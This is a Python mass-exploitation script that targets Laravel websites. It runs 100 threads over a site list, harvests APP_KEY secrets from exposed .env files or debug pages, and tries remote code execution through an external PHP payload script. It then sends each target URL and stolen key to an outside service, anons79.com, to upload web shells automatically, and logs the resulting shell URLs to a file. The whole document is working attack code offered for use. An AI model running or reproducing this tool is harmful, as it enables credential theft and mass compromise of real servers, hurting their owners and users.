import requests, re, sys, subprocess
from multiprocessing.dummy import Pool

appkeyCommand = open('inc/appkeyCommand.txt', 'r').read().splitlines()
headers = {'User-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
timeout = 20

def exploit(url):
    try:
        if '/.env' in url:
            url = url.replace('/.env', '')
        else:pass
        
        print (f'[!] Check : {url}')
        
        # Getting APP_KEY
        check_env = requests.get(url +'/.env', headers=headers, timeout=timeout, verify=False, allow_redirects=False).text
        check_config = requests.post(url, data={"0x[]":"trustsec"}, headers=headers, timeout=timeout, verify=False, allow_redirects=False).text
        
        if 'APP_KEY' in check_env:
            appkey = re.findall(r"APP_KEY=(.*?)\n", check_env)[0]
        elif 'APP_KEY' in check_config:
            appkey = re.findall("<td>APP_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", check_config)[0]
        else:
            print (f'[!] {url} : Cant find APP_KEY...')
            open('appkeyrce_nokey.txt', 'a').write(url +'\n')
            return False
        
        # Try to check vulnerabel with payloads
        for command in appkeyCommand:
            vulnerable = subprocess.getoutput(f'php appkeyrce.php url={url} key="{appkey}" {command}')
            if 'trustsec0x0777' in vulnerable:
                open('appkeyrce.txt', 'a').write(url +'\n')
                break
            
        # Try to upload shell with anons79.com
        anons79 = 'https://anons79.com/'
        anons79data = {'target': url, 'key': appkey, 'autoshell': 'Auto Upload Shell'}
        check = requests.post(anons79, headers=headers, data=anons79data, timeout=timeout).text
        
        if 'Shell uploaded' in check:
            shell = re.findall(r"[+] Shell uploaded ===> <a href='(.*?)' target='_blank'>", check)[0]
            print (f'[!] Shell : {str(shell)}')
            open('shells.txt', 'a').write(f'{shell}\n')
        else:pass
            
    except:
          print (f'[!] Error : {url}')
          open('appkeyrce_err.txt', 'a').write(url +'\n')
    
    
def main():
	sitelist = input("[?] Sitelist : ")
	if sitelist == "":
		print("[!] Put Sitelist!")
		main()
	else:
		try:
			sites = open(sitelist, "r").read().splitlines()
			try:
				execute = Pool(100)
				execute.map(exploit, sites)
			except:
				pass
		except:
			print("[!] Sitelist not found!")
			sys.exit()

if __name__ == '__main__':
    main()